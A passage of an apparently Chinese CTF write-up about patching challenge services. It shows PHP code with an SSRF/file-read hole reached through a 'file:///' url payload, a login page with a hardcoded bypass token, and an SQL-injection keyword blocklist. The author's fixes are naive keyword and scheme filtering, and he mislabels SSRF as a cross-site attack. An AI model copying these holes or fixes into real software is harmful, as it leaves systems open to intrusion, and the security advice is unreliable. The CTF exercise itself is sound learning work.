class="comment"># d = invert(e, (p-1)*(q-1))</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;私钥 d = <span class="subst">&#123;d&#125;</span>&#x27;</span>)</span><br><span class="line">r = getPrime(<span class="number">20</span>)  <span class="comment"># r为盲因子</span></span><br></pre></td></tr></table></figure><h2 id="Fix部分"><a href="#Fix部分" class="headerlink" title="Fix部分"></a>Fix部分</h2><h3 id="PWN-1"><a href="#PWN-1" class="headerlink" title="PWN"></a>PWN</h3><p>因为PWN都不知道咋整，所以PWN直接果断放弃</p><h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><h4 id="Try2ReadFlag-fix"><a href="#Try2ReadFlag-fix" class="headerlink" title="Try2ReadFlag-fix"></a>Try2ReadFlag-fix</h4><p>我在上面也说了，这个我队里的人说是跨站攻击，所以我就去看了一下是咋整的</p><p>我看他做的时候是后面加了<code>/?id=file:///&lt;file&gt;</code>这样的语句，所以我就在想是不是可以对协议头做出限制</p><p>在<code>index.php</code>里面的底下很明显有有关的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;index&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- CSS --&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span>&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/css/bootstrap-theme.min.css&quot;</span>&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/css/bootstrap-theme.css&quot;</span>&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/js/bootstrap.js&quot;</span>&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/js/npm.js&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">clearfix</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12 <span class="title">column</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">nav</span> <span class="title">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span>&quot; <span class="title">role</span>=&quot;<span class="title">navigation</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">button</span>&quot; <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">toggle</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">collapse</span>&quot; <span class="title">data</span>-<span class="title">target</span>=&quot;#<span class="title">bs</span>-<span class="title">example</span>-<span class="title">navbar</span>-<span class="title">collapse</span>-1&quot;&gt; &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">sr</span>-<span class="title">only</span>&quot;&gt;<span class="title">Toggle</span> <span class="title">navigation</span>&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>-<span class="title">bar</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>-<span class="title">bar</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>-<span class="title">bar</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">button</span>&gt; &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Brand</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">collapse</span> <span class="title">navbar</span>-<span class="title">collapse</span>&quot; <span class="title">id</span>=&quot;<span class="title">bs</span>-<span class="title">example</span>-<span class="title">navbar</span>-<span class="title">collapse</span>-1&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Link</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Link</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot; <span class="title">class</span>=&quot;<span class="title">dropdown</span>-<span class="title">toggle</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">dropdown</span>&quot;&gt;<span class="title">Dropdown</span>&lt;<span class="title">strong</span> <span class="title">class</span>=&quot;<span class="title">caret</span>&quot;&gt;&lt;/<span class="title">strong</span>&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>-<span class="title">menu</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Action</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Another</span> <span class="title">action</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Something</span> <span class="title">else</span> <span class="title">here</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">divider</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Separated</span> <span class="title">link</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">divider</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">One</span> <span class="title">more</span> <span class="title">separated</span> <span class="title">link</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">form</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">form</span> <span class="title">navbar</span>-<span class="title">left</span>&quot; <span class="title">role</span>=&quot;<span class="title">search</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt; &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">default</span>&quot;&gt;<span class="title">Submit</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">right</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Link</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot; <span class="title">class</span>=&quot;<span class="title">dropdown</span>-<span class="title">toggle</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">dropdown</span>&quot;&gt;<span class="title">Dropdown</span>&lt;<span class="title">strong</span> <span class="title">class</span>=&quot;<span class="title">caret</span>&quot;&gt;&lt;/<span class="title">strong</span>&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>-<span class="title">menu</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Action</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Another</span> <span class="title">action</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Something</span> <span class="title">else</span> <span class="title">here</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">divider</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                  &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Separated</span> <span class="title">link</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">jumbotron</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">          <span class="title">Hello</span>, <span class="title">Ctfer</span>!</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">clearfix</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-4 <span class="title">column</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">Page1</span></span></span><br><span class="line"><span class="class">      &lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">url</span>=<span class="title">http</span>://127.0.0.1/1.<span class="title">html</span>&quot;&gt;<span class="title">View</span> <span class="title">details</span> »&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-4 <span class="title">column</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">Page2</span></span></span><br><span class="line"><span class="class">      &lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">url</span>=<span class="title">http</span>://127.0.0.1/2.<span class="title">html</span>&quot;&gt;<span class="title">View</span> <span class="title">details</span> »&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-4 <span class="title">column</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">Page3</span></span></span><br><span class="line"><span class="class">      &lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">url</span>=<span class="title">http</span>://127.0.0.1/3.<span class="title">html</span>&quot;&gt;<span class="title">View</span> <span class="title">details</span> »&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">$<span class="title">url</span> = $<span class="title">_GET</span>[&#x27;<span class="title">url</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">input</span> = <span class="title">explode</span>(&quot;:&quot;, $<span class="title">url</span>)[0];</span></span><br><span class="line"><span class="class"><span class="title">if</span> ($<span class="title">input</span> == &quot;<span class="title">http</span>&quot; <span class="title">or</span> $<span class="title">input</span> == &quot;<span class="title">file</span>&quot;)</span>&#123;</span><br><span class="line">  <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Fix方法：直接把后面的file有关的删了就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;:&quot;</span>, <span class="variable">$url</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$input</span> == <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">  <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传修改后的php文件，等待Check，100分到手！</p><h4 id="EzLogin-fix"><a href="#EzLogin-fix" class="headerlink" title="EzLogin-fix"></a>EzLogin-fix</h4><p>这个就是我上面说拿到文件看到<code>robots.txt</code>才发现还有这一招的那一题，在这个网页上面不管输什么账号密码都会弹出<code>只有本地管理员才能够登录</code>，在文件里面有一句提示</p><blockquote><p>&#x2F;&#x2F; 光改密码不会好的：）建议你去修修 SQL 注入，和另外一个文件里的那个漏洞</p></blockquote><p>所以考点至少有个SQL注入，在网上浏览的时候发现在mysql执行指令的时候，有<code>#</code>的话后面的东西会被当成注释，所以sql注入的修复方法之一就是检测到<code>#</code>的出现就直接给它<code>die</code>一下（队里的人说单引号也是一个重要的点所以我也对单引号进行了校验）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;ezlogin&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">username &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">password &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="comment">// 来自 glzjin 的温馨提示：only_check 请不要删，不然 check 会不通过的嗷:)</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;only_check&#x27;</span>] !== <span class="string">&quot;nifuerhfueritfhgeyg4rh3333&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只有本地管理员才能登陆！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/union|&#x27;|\&quot;|&gt;|=|&lt;|sleep| |\^|case|like|sleep/i&quot;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;?????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/union|&#x27;|\&quot;|&gt;|=|&lt;|sleep| |\^|case|like|sleep/i&quot;</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;?????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dbhost</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">    <span class="variable">$dbuser</span> = <span 